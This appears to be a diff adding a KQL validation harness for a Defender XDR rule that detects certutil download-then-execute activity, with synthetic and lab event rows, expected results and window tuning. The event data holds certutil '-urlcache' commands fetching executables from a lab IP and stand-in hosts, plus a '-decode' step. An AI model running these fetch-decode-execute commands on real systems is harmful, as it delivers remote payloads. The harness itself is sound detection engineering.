@@ -1,0 +1,514 @@
+// Certutil Download -> Execution
+// Synthetic Defender XDR DeviceProcessEvents validation harness.
+//
+// Scenario 1 is based on real Sysmon telemetry captured in the lab.
+// Other scenarios are controlled synthetic test cases.
+
+let FinalCorrelationWindow = 10m;
+
+let DeviceProcessEvents = datatable(
+    Timestamp:datetime,
+    DeviceId:string,
+    DeviceName:string,
+    FileName:string,
+    FolderPath:string,
+    ProcessCommandLine:string,
+    InitiatingProcessFileName:string,
+    InitiatingProcessCommandLine:string,
+    AccountName:string,
+    Scenario:string
+)
+[
+    // ============================================================
+    // Scenario 1 - Direct executable download + execution
+    // Real lab event shape translated from Sysmon
+    // ============================================================
+
+    datetime(2026-09-25 07:28:12.032),
+    "device-s1",
+    "DESKTOP-5BL4PPV",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"""C:\Windows\System32\certutil.exe"" -urlcache -f http://192.168.11.165:8000/lab-payload.exe lab-payload.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"DESKTOP-5BL4PPV\kemal",
+    "Scenario 1 - Direct Download + Execution",
+
+    datetime(2026-09-25 07:28:24.733),
+    "device-s1",
+    "DESKTOP-5BL4PPV",
+    "lab-payload.exe",
+    @"C:\Temp\certutil-lab",
+    @"""C:\Temp\certutil-lab\lab-payload.exe""",
+    "powershell.exe",
+    @"powershell.exe",
+    @"DESKTOP-5BL4PPV\kemal",
+    "Scenario 1 - Direct Download + Execution",
+
+    // ============================================================
+    // Scenario 2 - Download + decode + execution
+    // ============================================================
+
+    datetime(2026-09-25 08:00:00),
+    "device-s2",
+    "LAB-S2",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/stage.b64 stage.b64",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S2\user",
+    "Scenario 2 - Download + Decode + Execution",
+
+    datetime(2026-09-25 08:00:15),
+    "device-s2",
+    "LAB-S2",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -decode stage.b64 decoded.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S2\user",
+    "Scenario 2 - Download + Decode + Execution",
+
+    datetime(2026-09-25 08:00:25),
+    "device-s2",
+    "LAB-S2",
+    "decoded.exe",
+    @"C:\Temp",
+    @"C:\Temp\decoded.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S2\user",
+    "Scenario 2 - Download + Decode + Execution",
+
+    // ============================================================
+    // Scenario 3 - Legitimate CRL retrieval
+    // Naive rule fires; correlated rule must not.
+    // ============================================================
+
+    datetime(2026-09-25 08:10:00),
+    "device-s3",
+    "LAB-S3",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://crl.example.test/root.crl root.crl",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S3\user",
+    "Scenario 3 - Legitimate CRL Retrieval",
+
+    // ============================================================
+    // Scenario 4 - Download only
+    // ============================================================
+
+    datetime(2026-09-25 08:20:00),
+    "device-s4",
+    "LAB-S4",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/download-only.exe download-only.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S4\user",
+    "Scenario 4 - Download Only",
+
+    // ============================================================
+    // Scenario 5 - Unrelated execution
+    // ============================================================
+
+    datetime(2026-09-25 08:30:00),
+    "device-s5",
+    "LAB-S5",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/fileA.exe fileA.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S5\user",
+    "Scenario 5 - Unrelated Execution",
+
+    datetime(2026-09-25 08:30:20),
+    "device-s5",
+    "LAB-S5",
+    "fileB.exe",
+    @"C:\Temp",
+    @"C:\Temp\fileB.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S5\user",
+    "Scenario 5 - Unrelated Execution",
+
+    // ============================================================
+    // Scenario 6 - Matching execution after 20 minutes
+    // Outside chosen 10m window
+    // ============================================================
+
+    datetime(2026-09-25 08:40:00),
+    "device-s6",
+    "LAB-S6",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/delayed.exe delayed.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S6\user",
+    "Scenario 6 - Execution Outside Window",
+
+    datetime(2026-09-25 09:00:00),
+    "device-s6",
+    "LAB-S6",
+    "delayed.exe",
+    @"C:\Temp",
+    @"C:\Temp\delayed.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S6\user",
+    "Scenario 6 - Execution Outside Window",
+
+    // ============================================================
+    // Scenario 7 - Browser download + execution
+    // No certutil retrieval
+    // ============================================================
+
+    datetime(2026-09-25 09:10:00),
+    "device-s7",
+    "LAB-S7",
+    "msedge.exe",
+    @"C:\Program Files\Microsoft\Edge\Application",
+    @"msedge.exe http://example.test/browser-payload.exe",
+    "explorer.exe",
+    @"explorer.exe",
+    @"LAB-S7\user",
+    "Scenario 7 - Browser Download + Execution",
+
+    datetime(2026-09-25 09:10:30),
+    "device-s7",
+    "LAB-S7",
+    "browser-payload.exe",
+    @"C:\Users\user\Downloads",
+    @"C:\Users\user\Downloads\browser-payload.exe",
+    "explorer.exe",
+    @"explorer.exe",
+    @"LAB-S7\user",
+    "Scenario 7 - Browser Download + Execution",
+
+    // ============================================================
+    // Scenario 8 - Different user + different parent
+    // Matching payload executes after 7 minutes.
+    //
+    // Same-device correlation should detect this.
+    // Same-user correlation would miss it.
+    // ============================================================
+
+    datetime(2026-09-25 09:20:00),
+    "device-s8",
+    "LAB-S8",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/context.exe context.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-S8\userA",
+    "Scenario 8 - Different User / Parent",
+
+    datetime(2026-09-25 09:27:00),
+    "device-s8",
+    "LAB-S8",
+    "context.exe",
+    @"C:\ProgramData",
+    @"C:\ProgramData\context.exe",
+    "services.exe",
+    @"services.exe",
+    @"LAB-S8\userB",
+    "Scenario 8 - Different User / Parent",
+
+    // ============================================================
+    // Tuning-only basename collision
+    //
+    // Certutil downloads common.exe.
+    // Twenty minutes later an unrelated common.exe executes from
+    // another path.
+    //
+    // Filename-only correlation will incorrectly match this if the
+    // window is expanded to 30 minutes.
+    // ============================================================
+
+    datetime(2026-09-25 10:00:00),
+    "device-tuning",
+    "LAB-TUNING",
+    "certutil.exe",
+    @"C:\Windows\System32",
+    @"certutil.exe -urlcache -f http://example.test/common.exe common.exe",
+    "powershell.exe",
+    @"powershell.exe",
+    @"LAB-TUNING\user",
+    "Tuning - Same Basename Collision",
+
+    datetime(2026-09-25 10:20:00),
+    "device-tuning",
+    "LAB-TUNING",
+    "common.exe",
+    @"C:\Program Files\Vendor",
+    @"C:\Program Files\Vendor\common.exe",
+    "services.exe",
+    @"services.exe",
+    @"LAB-TUNING\user",
+    "Tuning - Same Basename Collision"
+];
+
+// ================================================================
+// NAIVE RULE
+// certutil + HTTP
+// ================================================================
+
+let NaiveAlerts =
+    DeviceProcessEvents
+    | where FileName =~ "certutil.exe"
+    | where ProcessCommandLine contains "http://"
+        or ProcessCommandLine contains "https://"
+    | summarize NaiveAlerts=count() by Scenario;
+
+// ================================================================
+// DOWNLOAD EVENTS
+// Explicit destination argument only.
+// ================================================================
+
+let Downloads =
+    DeviceProcessEvents
+    | where FileName =~ "certutil.exe"
+    | where ProcessCommandLine contains "-urlcache"
+    | where ProcessCommandLine contains "http://"
+        or ProcessCommandLine contains "https://"
+    | extend CleanCommandLine =
+        replace_string(ProcessCommandLine, '"', '')
+    | extend DownloadURL =
+        extract(@"(?i)https?://[^\s]+", 0, CleanCommandLine)
+    | extend DownloadedFile =
+        extract(@"(?i)https?://\S+\s+([^\s]+)\s*$", 1, CleanCommandLine)
+    | where isnotempty(DownloadedFile)
+    | project
+        DeviceId,
+        DeviceName,
+        Scenario,
+        DownloadAccount=AccountName,
+        DownloadTime=Timestamp,
+        DownloadCommandLine=ProcessCommandLine,
+        DownloadURL,
+        DownloadedFile;
+
+// ================================================================
+// DECODE EVENTS
+// ================================================================
+
+let Decodes =
+    DeviceProcessEvents
+    | where FileName =~ "certutil.exe"
+    | where ProcessCommandLine contains "-decode"
+    | extend CleanCommandLine =
+        replace_string(ProcessCommandLine, '"', '')
+    | extend DecodeInput =
+        extract(@"(?i)-decode\s+([^\s]+)\s+([^\s]+)\s*$", 1, CleanCommandLine)
+    | extend DecodedFile =
+        extract(@"(?i)-decode\s+([^\s]+)\s+([^\s]+)\s*$", 2, CleanCommandLine)
+    | where isnotempty(DecodeInput)
+    | where isnotempty(DecodedFile)
+    | project
+        DeviceId,
+        DecodeTime=Timestamp,
+        DecodeCommandLine=ProcessCommandLine,
+        DecodeInput,
+        DecodedFile;
+
+// ================================================================
+// EXECUTIONS
+// ================================================================
+
+let Executions =
+    DeviceProcessEvents
+    | where FileName endswith ".exe"
+    | where FileName !~ "certutil.exe"
+    | project
+        DeviceId,
+        ExecutionTime=Timestamp,
+        ExecutedFile=FileName,
+        ExecutionFolderPath=FolderPath,
+        ExecutionCommandLine=ProcessCommandLine,
+        ExecutionAccount=AccountName,
+        InitiatingProcessFileName;
+
+// ================================================================
+// DIRECT DOWNLOAD -> EXECUTION CANDIDATES
+// No correlation window applied yet.
+// ================================================================
+
+let DirectCandidates =
+    Downloads
+    | join kind=inner Executions on DeviceId
+    | where ExecutionTime > DownloadTime
+    | where tolower(ExecutedFile) == tolower(DownloadedFile)
+    | extend DecodeObserved=false
+    | project
+        Scenario,
+        DeviceId,
+        DeviceName,
+        DownloadAccount,
+        DownloadTime,
+        DownloadCommandLine,
+        DownloadURL,
+        DownloadedFile,
+        DecodeObserved,
+        ExecutionTime,
+        ExecutedFile,
+        ExecutionFolderPath,
+        ExecutionCommandLine,
+        ExecutionAccount,
+        InitiatingProcessFileName;
+
+// ================================================================
+// DOWNLOAD -> DECODE -> EXECUTION CANDIDATES
+// ================================================================
+
+let DecodeCandidates =
+    Downloads
+    | join kind=inner Decodes on DeviceId
+    | where DecodeTime > DownloadTime
+    | where tolower(DecodeInput) == tolower(DownloadedFile)
+    | join kind=inner Executions on DeviceId
+    | where ExecutionTime > DecodeTime
+    | where tolower(ExecutedFile) == tolower(DecodedFile)
+    | extend DecodeObserved=true
+    | project
+        Scenario,
+        DeviceId,
+        DeviceName,
+        DownloadAccount,
+        DownloadTime,
+        DownloadCommandLine,
+        DownloadURL,
+        DownloadedFile,
+        DecodeObserved,
+        ExecutionTime,
+        ExecutedFile,
+        ExecutionFolderPath,
+        ExecutionCommandLine,
+        ExecutionAccount,
+        InitiatingProcessFileName;
+
+// ================================================================
+// ALL MATCHING CANDIDATES
+// ================================================================
+
+let Candidates =
+    union DirectCandidates, DecodeCandidates;
+
+// ================================================================
+// FINAL 10-MINUTE CORRELATED DETECTION
+// ================================================================
+
+let FinalCorrelations =
+    Candidates
+    | where ExecutionTime <= DownloadTime + FinalCorrelationWindow
+    | extend TimeToExecution = ExecutionTime - DownloadTime;
+
+// ================================================================
+// FINAL VALIDATION
+// ================================================================
+
+let CorrelatedAlerts =
+    FinalCorrelations
+    | summarize CorrelatedAlerts=count() by Scenario;
+
+let ExpectedResults = datatable(
+    Scenario:string,
+    ExpectedCorrelated:long
+)
+[
+    "Scenario 1 - Direct Download + Execution", 1,
+    "Scenario 2 - Download + Decode + Execution", 1,
+    "Scenario 3 - Legitimate CRL Retrieval", 0,
+    "Scenario 4 - Download Only", 0,
+    "Scenario 5 - Unrelated Execution", 0,
+    "Scenario 6 - Execution Outside Window", 0,
+    "Scenario 7 - Browser Download + Execution", 0,
+    "Scenario 8 - Different User / Parent", 1
+];
+
+let ValidationSummary =
+    ExpectedResults
+    | join kind=leftouter NaiveAlerts on Scenario
+    | join kind=leftouter CorrelatedAlerts on Scenario
+    | extend NaiveAlerts=coalesce(NaiveAlerts, 0)
+    | extend CorrelatedAlerts=coalesce(CorrelatedAlerts, 0)
+    | extend Result=
+        iff(CorrelatedAlerts == ExpectedCorrelated, "PASS", "FAIL")
+    | project
+        Scenario,
+        NaiveAlerts,
+        ExpectedCorrelated,
+        CorrelatedAlerts,
+        Result;
+
+// ================================================================
+// WINDOW TUNING
+// ================================================================
+
+let Windows = datatable(
+    WindowLabel:string,
+    Window:timespan
+)
+[
+    "5 minutes", 5m,
+    "10 minutes", 10m,
+    "30 minutes", 30m
+];
+
+let GroundTruth = datatable(
+    Scenario:string,
+    IsTruePositive:bool
+)
+[
+    "Scenario 1 - Direct Download + Execution", true,
+    "Scenario 2 - Download + Decode + Execution", true,
+    "Scenario 3 - Legitimate CRL Retrieval", false,
+    "Scenario 4 - Download Only", false,
+    "Scenario 5 - Unrelated Execution", false,
+    "Scenario 6 - Execution Outside Window", true,
+    "Scenario 7 - Browser Download + Execution", false,
+    "Scenario 8 - Different User / Parent", true,
+    "Tuning - Same Basename Collision", false
+];
+
+let WindowedAlerts =
+    Candidates
+    | extend JoinKey=1
+    | join kind=inner (
+        Windows
+        | extend JoinKey=1
+    ) on JoinKey
+    | where ExecutionTime <= DownloadTime + Window
+    | summarize Alerts=count() by WindowLabel, Scenario;
+
+let WindowSummary =
+    Windows
+    | extend JoinKey=1
+    | join kind=inner (
+        GroundTruth
+        | extend JoinKey=1
+    ) on JoinKey
+    | join kind=leftouter WindowedAlerts on WindowLabel, Scenario
+    | extend Alerts=coalesce(Alerts, 0)
+    | summarize
+        TP=countif(IsTruePositive and Alerts > 0),
+        FP=countif(not(IsTruePositive) and Alerts > 0),
+        FN=countif(IsTruePositive and Alerts == 0)
+        by WindowLabel, Window
+    | order by Window asc;
+
+// ================================================================
+// RUN THIS FIRST
+// ================================================================
+
+ValidationSummary
+| order by Scenario asc
